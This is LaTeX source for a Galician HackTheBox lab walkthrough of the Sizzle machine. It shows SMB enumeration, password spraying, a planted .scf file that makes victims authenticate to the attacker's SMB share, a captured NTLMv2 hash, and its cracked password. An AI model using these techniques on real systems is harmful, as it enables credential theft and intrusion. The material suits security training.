@@ -1,0 +1,1313 @@
+\documentclass[a4paper]{article}
+
+\usepackage[utf8]{inputenc}
+\usepackage[galician]{babel}
+\usepackage[margin=2cm, top=2cm, includefoot, bottom=2.4cm]{geometry}
+\usepackage{graphicx} %Inserción imaxes
+\usepackage[export]{adjustbox}
+\graphicspath{ {images/} }
+\usepackage[table,xcdraw]{xcolor}
+\usepackage[utf8]{inputenc}
+\usepackage[most]{tcolorbox} %Inserción cadrados
+\usepackage{fancyhdr} % Definición estilo páxina
+\usepackage[hidelinks]{hyperref} % Xestión hipervínculos
+\usepackage{listings} %Inserción de código no documento
+\usepackage{parskip} %Quitar tabulación paragrafos
+\usepackage{smartdiagram}
+\usepackage{tikz}
+\usepackage{zed-csp} %Inserción de esquemas
+\usepackage{enumitem}
+\usepackage[none]{hyphenat} %Evitar cortar palabras no fin de liña
+\usepackage[toc,page]{appendix}
+
+% Cores
+\definecolor{bluePortada}{HTML}{0850BF}
+\definecolor{blackFondoImaxes}{HTML}{1A1C23}
+
+% Variables
+\newcommand{\logoPortada}{hackthebox_logo_new.png}
+\newcommand{\machineName}{Sizzle}\par
+\newcommand{\logoMachine}{machine_sizzle_logo.png}
+\newcommand{\logoMachineRhead}{machine_sizzle_logo_rhead.png}
+\newcommand{\infoMachine}{machine_sizzle_info.png}
+\newcommand{\pingMachine}{ping_sizzle.png}
+\newcommand{\wfuzzMachine}{wfuzz_sizzle.png}
+\newcommand{\wfuzzCertMachine}{wfuzz2_sizzle.png}
+\newcommand{\wfuzzDownloadCertMachine}{wfuzz3_sizzle.png}
+\newcommand{\wfuzzRequestCertMachine}{wfuzz4_sizzle.png}
+\newcommand{\wfuzzAdvancedDownloadCertMachine}{wfuzz5_sizzle.png}
+\newcommand{\wfuzzDownloadCertRequiredMachine}{wfuzz6_sizzle.png}
+\newcommand{\nmapAllPorts}{nmap_sizzle_allPorts.png}
+\newcommand{\nmapTargeted}{nmap_sizzle_targeted.png}
+\newcommand{\hoveringMachine}{hovering_sizzle.png}
+\newcommand{\searchsploitMachine}{machine_sizzle_searchsploit.png}
+\newcommand{\ccbysa}{88x31.png}
+\newcommand{\bloodhound}{graph-bloodhound-elevation-privilege.png}
+\newcommand{\urlsInterese}{urls-de-interese.png}
+\newcommand{\sharphounduploadDatasizzle}{sharphound_uploadData_sizzle.png}
+\newcommand{\sharphoundOwnedsizzle}{sharphound_Owned_sizzle.png}
+\newcommand{\sharphoundpathstoDomainAdminssizzle}{sharphound_paths_to_Domain_Admins_sizzle.png}
+\newcommand{\sharphoundHighValuesizzle}{sharphound_High_Value_sizzle.png}
+\newcommand{\sharphoundpathstoDomainAdminsfromHighValuesizzle}{sharphound_paths_to_Domain_Admins_from_High_Value_sizzle.png}
+\newcommand{\sharphoundmrlkyDCSyncRightssizzle}{sharphound_mrlky_DCSync_Rights_sizzle.png}
+\newcommand{\sharphoundmrlkyPathsfromOwnedsizzle}{sharphound_mrlky_Paths_from_Owned_sizzle.png}
+\newcommand{\sharphoundmrlkyPathstoHeresizzle}{sharphound_mrlky_Paths_to_Here_sizzle.png}
+\newcommand{\sharphoundkerberoastableaccountssizzle}{sharphound_kerberoastable_accounts_sizzle.png}
+%\newcommand{\startDate}{06/07/2022}
+\newcommand{\startDate}{\today}
+\newcommand{\ipTarget}{10.10.10.103}
+\newcommand{\ipLocal}{10.10.14.12}
+\renewcommand{\lstlistingname}{Código}
+\renewcommand{\appendixpagename}{Anexos}
+\renewcommand{\appendixtocname}{Anexos}
+\renewcommand{\appendixname}{Anexo}
+
+% Adicionais
+\setlength{\headheight}{60.2pt}
+\setlength{\footskip}{20pt}
+\setlength{\textheight}{680pt}
+\pagestyle{fancy}
+\fancyhf{}
+\fancyhfoffset[L,R]{1.4cm}
+\lhead{\includegraphics[width=6cm]{\logoPortada}\\}
+\rhead{\includegraphics[width=5cm]{\logoMachineRhead}}
+\fancyfoot[R]{\hspace{0.1cm}\\\hspace{0.1cm}\\\thepage}
+\fancyfoot[L]{\textbf{Ricardo Feijoo Costa}\\
+\href{http://creativecommons.org/licenses/by-sa/4.0/}{\includegraphics[scale=0.6]{\ccbysa}}\\
+\href{http://creativecommons.org/licenses/by-sa/4.0/}{\textbf{\color{blue}Creative Commons Attribution-ShareAlike 4.0 International License}}}
+\renewcommand{\headrulewidth}{3pt}
+\definecolor{codegreen}{rgb}{0,0.6,0}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
+
+\lstdefinestyle{mystyle}{
+    backgroundcolor=\color{backcolour},   
+    commentstyle=\color{codegreen},
+    keywordstyle=\color{magenta},
+    numberstyle=\tiny\color{codegray},
+    stringstyle=\color{codepurple},
+    basicstyle=\ttfamily\footnotesize,
+    breakatwhitespace=false,         
+    breaklines=true,                 
+    captionpos=b,                    
+    keepspaces=true,                 
+    numbers=left,                    
+    numbersep=5pt,                  
+    showspaces=false,                
+    showstringspaces=false,
+    showtabs=false,                  
+    tabsize=2,
+    escapechar=¬,
+    columns=fullflexible
+}
+
+\lstset{style=mystyle}
+
+\usetikzlibrary{positioning, shapes, arrows, shadows.blur}
+\makeatletter % N.B.
+\tikzset{module/.style={%
+      \pgfkeysvalueof{/smart diagram/module shape},
+      thick,
+      draw=\sm@core@bordercolor,
+      top color=white,
+      bottom color=\col,
+      text=\sm@core@textcolor,
+      % text width=\sm@core@moduletextwidth, % Only necessary change
+      minimum width=\sm@core@modulewidth,
+      minimum height=\sm@core@moduleheight,
+      font=\sm@core@modulefontsize,
+      \sm@core@borderdecoration,
+      node distance=1cm
+   },
+   diagram arrow type/.style={%
+      \sm@core@arrowstyle,
+      >=\sm@core@arrowtip,
+      line width=\sm@core@arrowlinewidth,
+      \col
+   },%
+}
+\makeatother
+
+% ------------------------------------------------------------
+\begin{document}
+        \begin{titlepage}
+        \vspace*{-3cm}
+        \centering
+        \href{https://www.hackthebox.com/}{\includegraphics[width=0.5\textwidth]{\logoPortada}}\par\vspace{1cm}
+        {\scshape\LARGE \textbf{Informe Técnico: Walkthrough}\par}
+        \vfill
+        {\Huge\bfseries\textcolor{bluePortada}{Máquina retirada: \machineName}\par}
+        \vfill
+        \includegraphics[width=1.0\textwidth,height=10cm,keepaspectratio,cfbox=blue 1pt 1pt]{\logoMachine}\par\
+        % ------------------------------------------------------------
+        \tikzstyle{blockRounder} = [rectangle, draw, text centered, rounded corners=3pt, minimum height=2em, blur shadow={shadow blur steps=5}]
+        \tikzstyle{connector} = [draw, -latex']
+        \begin{adjustbox}{width=0.9\paperwidth,center}
+          \begin{tikzpicture}
+          \node [blockRounder, fill=pink!80] at (-22.5,0) (start) {nmap};
+          \node [blockRounder, fill=green!8!white] at (-20.5,0) (one) {\begin{tabular}{c}smb shares\\no pass\end{tabular}};
+          \node [blockRounder, fill=blue!20] at (-17.4,0) (two) {\begin{tabular}{c}share Public\\Everyone FULL\end{tabular}};
+          \node [blockRounder, fill=green!20] at (-14.6,0) (three) {\begin{tabular}{c}exploit\\scf file\end{tabular}};
+          \node [blockRounder, fill=orange!20] at (-11.6,0) (four) {\begin{tabular}{c}Get\\Net-NTLMv2 hash\end{tabular}};
+          \node [blockRounder, fill=yellow!20] at (-8.0,0) (five) {\begin{tabular}{c}john the ripper\\user amanda\end{tabular}};
+          \node [blockRounder, fill=pink!20] at (-5.3,0) (six) {\begin{tabular}{c}wfuzz\\certsrv\end{tabular}};
+          \node [blockRounder, fill=cyan!20] at (-5.6,-1.25) (seven) {openssl};
+          \node [blockRounder, fill=violet!20] at (-8.8,-1.25) (eight) {http://10.10.10.103/certsrv};
+          \node [blockRounder, fill=brown!20] at (-13.1,-1.25) (nine) {\begin{tabular}{c}acceso ao sistema\\winrm ssl 5986\end{tabular}};
+          \node [blockRounder, fill=cyan!20] at (-16.9,-1.25) (ten) {\begin{tabular}{c}movemento lateral\\sharphound\end{tabular}};
+          \node [blockRounder, fill=teal!30] at (-20.5,-1.25) (eleven) {\begin{tabular}{c}Rubeus\\kerberoasting\end{tabular}};
+          \node [blockRounder, fill=magenta!30] at (-23.2,-1.25) (twelve) {\begin{tabular}{c}john\\hashcat\end{tabular}};
+          \node [blockRounder, fill=lime!60] at (-22,-2.5) (thirteen) {\begin{tabular}{c}DCSync Rights\\user mrlky\end{tabular}};
+          \node [blockRounder, fill=purple!60] at (-18,-2.5) (fourteen) {\begin{tabular}{c}escalada de privilexios\\secretsdump\end{tabular}};
+          \node [blockRounder, fill=teal!60] at (-13.8,-2.5) (fifteen) {\begin{tabular}{c}wmiexec (PtH)\\acceso administrator\end{tabular}};
+          \node [blockRounder, fill=olive!60] at (-10.5,-2.5) (sixteen) {\begin{tabular}{c}flag user\end{tabular}};
+          \node [blockRounder, fill=red!60] at (-7.8,-2.5) (end) {\begin{tabular}{c}flag root.txt\end{tabular}};
+          \path [connector] (start) -- (one);
+          \path [connector] (one) -- (two);
+          \path [connector] (two) -- (three);
+          \path [connector] (three) -- (four);
+          \path [connector] (four) -- (five);
+          \path [connector] (five) -- (six);
+          \path [connector] ([xshift=-2mm] six.south east) |- (seven);
+          \path [connector] (seven) -- (eight);
+          \path [connector] (eight) -- (nine);
+          \path [connector] (nine) -- (ten);
+          \path [connector] (ten) -- (eleven);
+          \path [connector] (eleven) -- (twelve);
+          \path [connector] ([xshift=2mm] twelve.south west) |- (thirteen);
+          \path [connector] (thirteen) -- (fourteen);
+          \path [connector] (fourteen) -- (fifteen);
+          \path [connector] (fifteen) -- (sixteen);
+          \path [connector] (sixteen) -- (end);
+          \end{tikzpicture}
+        \end{adjustbox}
+        \vfill
+        % ------------------------------------------------------------
+        \vspace*{-0.4cm} 
+        \begin{tcolorbox}[enhanced,attach boxed title to top center={yshift=-1mm,yshifttext=-1mm},
+        colback=red!5!white,colframe=red!75!black,colbacktitle=red!90!black,
+  title=LIMITACIÓN DE RESPONSABILIDADE,fonttitle=\bfseries,
+  boxed title style={size=small,colframe=red!75!black} ]
+               O autor do presente documento declina calquera responsabilidade asociada ao uso incorrecto e/ou malicioso que puidese realizarse coa información exposta no mesmo. Por tanto, non se fai responsable en ningún caso, nin pode ser considerado legalmente responsable en ningún caso, das consecuencias que poidan derivarse da información contida nel ou que esté enlazada dende ou hacia el, incluíndo os posibles erros e información incorrecta existentes, información difamatoria, así como das consecuencias que se poidan derivar sobre a súa aplicación en sistemas de información reais e/ou virtuais. Este documento foi xerado para uso didáctico e debe ser empregado en contornas privadas e virtuais controladas co permiso correspondente do administrador desas contornas.
+        \end{tcolorbox}
+        \begin{tcolorbox}[enhanced,attach boxed title to top center={yshift=-3mm,yshifttext=-1mm},
+  colback=blue!5!white,colframe=blue!75!black,colbacktitle=green!80!black,
+  title=De Interese,fonttitle=\bfseries,
+  boxed title style={size=small,colframe=red!50!black} ]
+  \centering
+        \begin{itemize}[leftmargin=5.5mm]
+        \item Informe xerado con \href{https://www.latex-project.org/}{\color{blue}{\LaTeX}}
+        \item Informe baseado no vídeo de \href{https://youtu.be/riNRHoEOBeU}{\color{blue}{S4vitar: Cómo crear un reporte profesional en LaTeX}}
+        \item \href{https://github.com/ricardofc/repoEDU-CCbySA/tree/main/SI/Pentester/ActiveDirectory}{\color{blue}{https://github.com/ricardofc/repoEDU-CCbySA/tree/main/SI/Pentester/ActiveDirectory}}
+        \end{itemize}
+\end{tcolorbox}
+        \vspace*{-0.1cm} 
+        {\large \startDate \par}
+        \end{titlepage}
+        % ------------------------------------------------------------
+        % Índice
+        \clearpage
+        \tableofcontents
+        \clearpage
+        % ------------------------------------------------------------
+        \section{Escenario}
+        \begin{itemize}
+                \item Plataforma \href{https://hackthebox.eu}{\textbf{\color{blue}HackTheBox}}.
+                \item Máquina retirada \textbf{\machineName} 
+        \end{itemize}
+        \vspace{0.2cm}
+        \begin{figure}[h]
+                \centering
+                \includegraphics[width=0.4\textwidth]{\infoMachine}
+                \caption{Detalles da máquina}
+        \end{figure}
+        \begin{tcolorbox}[enhanced,attach boxed title to top center={yshift=-3mm,yshifttext=-1mm},
+  colback=blue!5!white,colframe=blue!75!black,colbacktitle=green!80!black,
+  title=Dirección URL,fonttitle=\bfseries,
+  boxed title style={size=small,colframe=red!50!black} ]
+  \centering
+  \vspace{0.1cm}
+  \href{https://app.hackthebox.com/machines/169}{\color{blue}{https://app.hackthebox.com/machines/169}}
+\end{tcolorbox}
+
+        \section{Obxectivos}
+        \begin{itemize}
+                \item Auditar o servidor \textbf{\machineName}
+                \item Enumerar posibles vectores de explotación
+                \item Determinar alcance e impacto dun ataque sobre o sistema en produción.
+        \end{itemize}
+        \subsection{Fluxo de traballo}
+        \vspace{0.5cm}
+
+        \begin{figure}[h]
+                \begin{center}
+                \hspace*{4cm}
+                        \smartdiagram[priority descriptive diagram]{
+                        Recoñecemento sobre o sistema,
+                        Detección de vulnerabilidades,
+                        Explotación de vulnerabilidades,
+                        Escalada de privilexios
+                        }
+                        \begin{tikzpicture}[overlay]
+                                \node[left=of module4,xshift=-60mm,yshift=-13mm]{\begin{tcolorbox}[colback=white,colframe=red!75!black,hbox]{\textbf{\color{red}{Flag administrador}}}\end{tcolorbox}};
+                                \node[left=of module3,xshift=-60mm,yshift=-13mm]{\begin{tcolorbox}[colback=white,colframe=red!75!black,hbox]{\textbf{\color{red}{Acceso ao sistema: Flag usuario}}}\end{tcolorbox}};
+                                \node[left=of module2,xshift=-1mm,yshift=-1mm] {};
+                                \node[left=of module1,xshift=-1mm,yshift=1mm] {};
+                        \end{tikzpicture}
+                \end{center}
+                \caption{Fluxo de traballo}
+        \end{figure}
+
+        \clearpage
+
+        \section{Análisis de vulnerabilidades}
+        \subsection{Recoñemento inicial}
+        \vspace{0.2cm}
+        \begin{itemize}
+                \item Comprobación de conectividade e detección de sistema operativo: 
+                \begin{itemize}
+                        \item TTL $\simeq$ 64 $\Rightarrow$ GNU/Linux
+                        \item TTL $\simeq$ 128 $\Rightarrow$ Microsoft Windows
+                \end{itemize}
+
+        \begin{figure}[h]
+                \begin{center}
+                        \begin{tcolorbox}[colback=blackFondoImaxes,hbox]
+                                \includegraphics[width=0.5\textwidth,height=8cm,keepaspectratio]{\pingMachine}
+                        \end{tcolorbox}
+                \end{center}
+                \caption{Recoñecemento inicial sobre o sistema obxectivo}
+        \end{figure}
+
+        \vspace{0.2cm}
+
+                \item Escaneo/detección de portos abertos mediante \textbf{nmap}
+        \begin{lstlisting}[language=Bash, caption=nmap: Portos TCP open]
+$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ¬\ipTarget¬
+        \end{lstlisting}
+         \begin{figure}[h]
+                \begin{center}
+                        \begin{tcolorbox}[colback=blackFondoImaxes,hbox]
+                                \centering
+                                \includegraphics[width=0.5\textwidth,height=8cm,keepaspectratio]{\nmapAllPorts}
+                        \end{tcolorbox}
+                \end{center}
+                \caption{Recoñecemento con nmap}
+        \end{figure}
+
+        \clearpage
+        \item Detección de servizos e versións sobre os portos sobre os cales foi posible explotar o sistema:
+
+        \begin{lstlisting}[language=Bash, caption=nmap scripting sobre servizos e versións]
+$ sudo nmap -p80,389,443,445,3268,3269,5985,5986 -sCV -vvv -n ¬\ipTarget¬
+        \end{lstlisting}
+         \begin{figure}[h]
+                \begin{center}
+                \makebox[\textwidth]{\includegraphics[width=0.9\paperwidth]{\nmapTargeted}}
+                \caption{Numeración de servizos e versións}
+                \label{fig:servicesResults}
+                \end{center}
+        \end{figure}
+
+        \end{itemize}
+
+        \subsection{Enumeración ldap}
+        \vspace{0.2cm}
+
+        \begin{schema}{TCP}
+        Portos
+        \where
+        389,3268,3269
+        \end{schema}
+Revisando a saída do comando nmap na figura \ref{fig:servicesResults} da páxina \pageref{fig:servicesResults} obtemos información sobre ldap atopando o dominio \textit{htb.local} e o hostname \textit{sizzle.htb.local}. Entón engadimos estes nomes ao ficheiro /etc/hosts para a súa resolución:
+        \begin{lstlisting}[language=Bash, caption=Resolución DNS: /etc/hosts]
+$ sudo bash -c "echo '¬\ipTarget¬  sizzle.htb.local htb.local' >> /etc/hosts"\end{lstlisting}
+
+
+        \clearpage
+        \subsection{Enumeración smb}
+        \vspace{0.2cm}
+
+        \begin{schema}{TCP}
+        Porto
+        \where
+        445
+        \end{schema}
+ 
+        Revisamos se existen recursos compartidos e se é posible acceso sen autentificación:
+
+        \begin{lstlisting}[language=Bash, caption=smbclient]
+$ smbclient -N -L 10.10.10.103
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	CertEnroll      Disk      Active Directory Certificate Services share
+	Department Shares Disk      
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	Operations      Disk      
+	SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.103 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available\end{lstlisting}
+
+        Como somos quen de acceder a recursos compartidos imos comprobar permisos de acceso mediante a ferramenta smbmap:
+        \begin{lstlisting}[language=Bash, caption=smbmap]
+$ smbmap -H 10.10.10.103 -u 'guest'                       
+[+] IP: 10.10.10.103:445	Name: sizzle.htb.local                                  
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	CertEnroll                                        	NO ACCESS	Active Directory Certificate Services share
+	Department Shares                                 	READ ONLY	
+	IPC$                                              	READ ONLY	Remote IPC
+	NETLOGON                                          	NO ACCESS	Logon server share 
+	Operations                                        	NO ACCESS	
+	SYSVOL                                            	NO ACCESS	Logon server share\end{lstlisting}
+
+        Comprobamos o nome de dominio e hostname (xa atopados na enumeración ldap):
+        \begin{lstlisting}[language=Bash, caption=crackmapexec, linewidth=18.5cm]
+$ crackmapexec smb 10.10.10.103
+SMB 10.10.10.103 445 SIZZLE  [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)\end{lstlisting}
+
+        Investigamos nos recursos compartidos:
+        \begin{lstlisting}[language=Bash, caption=Recurso compartido: Department Shares]
+$ smbmap -H 10.10.10.103 -u 'guest' -r 'Department Shares'
+[+] IP: 10.10.10.103:445	Name: sizzle.htb.local                                  
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	Department Shares                                 	READ ONLY	
+	.\Department Shares\*
+	dr--r--r--                0 Tue Jul  3 15:22:32 2018	.
+	dr--r--r--                0 Tue Jul  3 15:22:32 2018	..
+	dr--r--r--                0 Mon Jul  2 19:21:43 2018	Accounting
+	dr--r--r--                0 Mon Jul  2 19:14:28 2018	Audit
+	dr--r--r--                0 Tue Jul  3 15:22:39 2018	Banking
+	dr--r--r--                0 Mon Jul  2 19:15:01 2018	CEO_protected
+	dr--r--r--                0 Mon Jul  2 19:22:06 2018	Devops
+	dr--r--r--                0 Mon Jul  2 19:11:57 2018	Finance
+	dr--r--r--                0 Mon Jul  2 19:16:11 2018	HR
+	dr--r--r--                0 Mon Jul  2 19:14:24 2018	Infosec
+	dr--r--r--                0 Mon Jul  2 19:13:59 2018	Infrastructure
+	dr--r--r--                0 Mon Jul  2 19:12:04 2018	IT
+	dr--r--r--                0 Mon Jul  2 19:12:09 2018	Legal
+	dr--r--r--                0 Mon Jul  2 19:15:25 2018	M&A
+	dr--r--r--                0 Mon Jul  2 19:14:43 2018	Marketing
+	dr--r--r--                0 Mon Jul  2 19:11:47 2018	R&D
+	dr--r--r--                0 Mon Jul  2 19:14:37 2018	Sales
+	dr--r--r--                0 Mon Jul  2 19:21:46 2018	Security
+	dr--r--r--                0 Mon Jul  2 19:16:54 2018	Tax
+	dr--r--r--                0 Tue Jul 10 21:39:32 2018	Users
+	dr--r--r--                0 Mon Jul  2 19:32:58 2018	ZZ_ARCHIVE\end{lstlisting}
+
+
+        \begin{lstlisting}[language=Bash, caption=Acceso ao recurso compartido: Department Shares]
+$ smbclient -N "//10.10.10.103/Department Shares"
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Tue Jul  3 15:22:32 2018
+  ..                                  D        0  Tue Jul  3 15:22:32 2018
+  Accounting                          D        0  Mon Jul  2 19:21:43 2018
+  Audit                               D        0  Mon Jul  2 19:14:28 2018
+  Banking                             D        0  Tue Jul  3 15:22:39 2018
+  CEO_protected                       D        0  Mon Jul  2 19:15:01 2018
+  Devops                              D        0  Mon Jul  2 19:19:33 2018
+  Finance                             D        0  Mon Jul  2 19:11:57 2018
+  HR                                  D        0  Mon Jul  2 19:16:11 2018
+  Infosec                             D        0  Mon Jul  2 19:14:24 2018
+  Infrastructure                      D        0  Mon Jul  2 19:13:59 2018
+  IT                                  D        0  Mon Jul  2 19:12:04 2018
+  Legal                               D        0  Mon Jul  2 19:12:09 2018
+  M&A                                 D        0  Mon Jul  2 19:15:25 2018
+  Marketing                           D        0  Mon Jul  2 19:14:43 2018
+  R&D                                 D        0  Mon Jul  2 19:11:47 2018
+  Sales                               D        0  Mon Jul  2 19:14:37 2018
+  Security                            D        0  Mon Jul  2 19:21:47 2018
+  Tax                                 D        0  Mon Jul  2 19:16:54 2018
+  Users                               D        0  Tue Jul 10 21:39:32 2018
+  ZZ_ARCHIVE                          D        0  Mon Jul  2 19:32:58 2018
+
+		7779839 blocks of size 4096. 3692610 blocks available
+smb: \> cd Users
+smb: \Users\> ls
+  .                                   D        0  Tue Jul 10 21:39:32 2018
+  ..                                  D        0  Tue Jul 10 21:39:32 2018
+  amanda                              D        0  Mon Jul  2 19:18:43 2018
+  amanda_adm                          D        0  Mon Jul  2 19:19:06 2018
+  bill                                D        0  Mon Jul  2 19:18:28 2018
+  bob                                 D        0  Mon Jul  2 19:18:31 2018
+  chris                               D        0  Mon Jul  2 19:19:14 2018
+  henry                               D        0  Mon Jul  2 19:18:39 2018
+  joe                                 D        0  Mon Jul  2 19:18:34 2018
+  jose                                D        0  Mon Jul  2 19:18:53 2018
+  lkys37en                            D        0  Tue Jul 10 21:39:04 2018
+  morgan                              D        0  Mon Jul  2 19:18:48 2018
+  mrb3n                               D        0  Mon Jul  2 19:19:20 2018
+  Public                              D        0  Wed Sep 26 05:45:32 2018
+
+		7779839 blocks of size 4096. 3693384 blocks available
+smb: \Users\> exit\end{lstlisting}
+
+Revisando o contido deses cartafoles de usuario non existe nada, pero, poden ser usuarios do dominio e cartafoles de perfiles? Entón, imos tratar esa saída para crear un ficheiro de usuarios e pasalos por crackmapexec:
+        \begin{tcolorbox}[enhanced,attach boxed title to top center={yshift=-3mm,yshifttext=-1mm},
+  colback=yellow,colframe=yellow!75!black,colbacktitle=yellow!40!black,
+  title=Sen kerberos,fonttitle=\bfseries,
+  boxed title style={size=small,colframe=yellow!50!black} ]
+        \centering
+Non podemos empregar \textbf{kerbrute} posto que o porto TCP 88 non está aberto.
+\end{tcolorbox}
+
+        \clearpage
+        \begin{lstlisting}[language=Bash, caption=Ficheiro posibles usuarios do dominio]
+$ cat users.txt
+amanda
+amanda_adm
+bill
+bob
+chris
+henry
+joe
+jose
+lkys37en
+morgan
+mrb3n
+Public\end{lstlisting}
+
+
+        \begin{lstlisting}[language=Bash, caption=Password Spraying]
+$ crackmapexec smb ¬\ipTarget¬ -u users.txt -p /usr/share/wordlists/rockyou.txt --continue-on-success\end{lstlisting}
+        \begin{tcolorbox}[enhanced,attach boxed title to top center={yshift=-3mm,yshifttext=-1mm},
+  colback=blue!5!white,colframe=blue!75!black,colbacktitle=green!80!black,
+  title=De Interese,fonttitle=\bfseries,
+  boxed title style={size=small,colframe=red!50!black} ]
+        \centering
+Coa opción \textbf{--continue-on-success} aínda que atope coincidencias segue probando co resto de usuarios.
+\end{tcolorbox}
+
+Non conseguimos ningunhas credenciais co cal imos revisar coa ferramenta \textbf{smbcacls} se temos permiso de escritura nalgún cartafol do recurso compartido:
+        \begin{lstlisting}[language=Bash, caption=smbcacls]
+$ rm revision.txt; while read line
+do     
+  echo $line | tee -a revision.txt
+  smbcacls "//10.10.10.103/Department Shares" Users/$line -N | tee -a revision.txt
+  echo | tee -a revision.txt
+done <users.txt\end{lstlisting}
+
+Entón vemos que no recurso compartido \textbf{Public} calquera \emph{(Everyone)} ten permiso \textbf{FULL}:                                    
+        \begin{lstlisting}[language=Bash, caption=Everyone permisos FULL sobre Public]
+Public
+REVISION:1
+CONTROL:SR|DI|DP
+OWNER:BUILTIN\Administrators
+GROUP:HTB\Domain Users
+ACL:Everyone:ALLOWED/OI|CI/FULL
+ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL
+ACL:BUILTIN\Administrators:ALLOWED/OI|CI|I/FULL
+ACL:Everyone:ALLOWED/OI|CI|I/READ
+ACL:NT AUTHORITY\SYSTEM:ALLOWED/OI|CI|I/FULL\end{lstlisting}
+
+Así, calquera con permiso de escritura nun recurso compartido: \textbf{exploit scf file}
+
+\clearpage
+        \section{Explotación de vulnerabilidades}
+        \vspace{0.2cm}
+        \subsection{Acceso ao sistema}
+        \vspace{0.2cm}
+
+
+        \begin{lstlisting}[language=Bash, caption=Exploit scf file, linewidth=18.7cm]
+$ cat file.scf
+[Shell]
+Command=2
+IconFile=\\¬\ipLocal¬\TMP\pentestlab.ico
+[Taskbar]
+Command=ToggleDesktop
+
+$ smbserver.py -smb2support TMP Sizzle/exploits
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed\end{lstlisting}
+
+
+        \begin{lstlisting}[language=Bash, caption=Net-NTLM hash]
+        $ smbclient -U'guest' //10.10.10.103/"Department Shares"
+Enter WORKGROUP\guest's password:
+Try "help" to get a list of possible commands.
+smb: \> cd users
+smb: \users\> cd public
+smb: \users\public\> help
+?              allinfo        altname        archive        backup
+blocksize      cancel         case_sensitive cd             chmod
+chown          close          del            deltree        dir
+du             echo           exit           get            getfacl
+geteas         hardlink       help           history        iosize
+lcd            link           lock           lowercase      ls
+l              mask           md             mget           mkdir
+more           mput           newer          notify         open
+posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir
+posix_unlink   posix_whoami   print          prompt         put
+pwd            q              queue          quit           readlink
+rd             recurse        reget          rename         reput
+rm             rmdir          showacls       setea          setmode
+scopy          stat           symlink        tar            tarmode
+timeout        translate      unlock         volume         vuid
+wdel           logon          listconnect    showconnect    tcon
+tdis           tid            utimes         logoff         ..
+!
+smb: \users\public\> put Sizzle/exploits/file.scf file.scf
+putting file Sizzle/exploits/file.scf as \users\public\file.scf (0,2 kb/s) (average 0,2 kb/s)
+smb: \users\public\> quit\end{lstlisting}
+
+
+Agora toca esperar a que algún usuario conéctese ao seu perfil cargándose así o recursos compartido Public:
+        \begin{lstlisting}[language=Bash, caption=Capturar Net-NTLMv2 hash, linewidth=18cm]
+$ smbserver.py -smb2support TMP Sizzle/exploits
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.10.103,59567)
+[*] AUTHENTICATE_MESSAGE (HTB\amanda,SIZZLE)
+[*] User SIZZLE\amanda authenticated successfully
+[*] amanda::HTB:aaaaaaaaaaaaaaaa:da2a23f18637081753f3cc42a08c2943:01010000000000000020cf9c0a76d80136ce6c14dbce1b250000
+000001001000540064006b005100770071006500670003001000540064006b0051007700710065006700020010006800640073004700770055004c
+006900040010006800640073004700770055004c006900070008000020cf9c0a76d801060004000200000008003000300000000000000001000000
+00200000d985b54362899eb410d1e753db3de646b5394007aafb76d92da0d8e0da38d3150a00100000000000000000000000000000000000090020
+0063006900660073002f00310030002e00310030002e00310034002e0031003400000000000000000000000000
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:TMP)
+[*] Disconnecting Share(1:IPC$)
+[*] Disconnecting Share(2:TMP)
+[*] Closing down connection (10.10.10.103,59567)
+[*] Remaining connections []\end{lstlisting}
+
+
+Agora temos un hash que non server para PtH (PasstheHash) pero si para intentar "crackear" mediante john ou hashcat:
+        \begin{lstlisting}[language=Bash, caption=Credenciais amanda, linewidth=18.6cm]
+$ cat hashes.txt
+amanda::HTB:aaaaaaaaaaaaaaaa:da2a23f18637081753f3cc42a08c2943:01010000000000000020cf9c0a76d80136ce6c14dbce1b250000
+000001001000540064006b005100770071006500670003001000540064006b0051007700710065006700020010006800640073004700770055
+004c006900040010006800640073004700770055004c006900070008000020cf9c0a76d8010600040002000000080030003000000000000000
+0100000000200000d985b54362899eb410d1e753db3de646b5394007aafb76d92da0d8e0da38d3150a00100000000000000000000000000000
+0000000900200063006900660073002f00310030002e00310030002e00310034002e0031003400000000000000000000000000
+
+$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Ashare1972       (amanda)     
+1g 0:00:00:19 DONE (2022-06-02 07:06) 0.05254g/s 599878p/s 599878c/s 599878C/s Ashbabez08..Ashanti01
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed.
+
+$ john --show --format=netntlmv2 hashes.txt
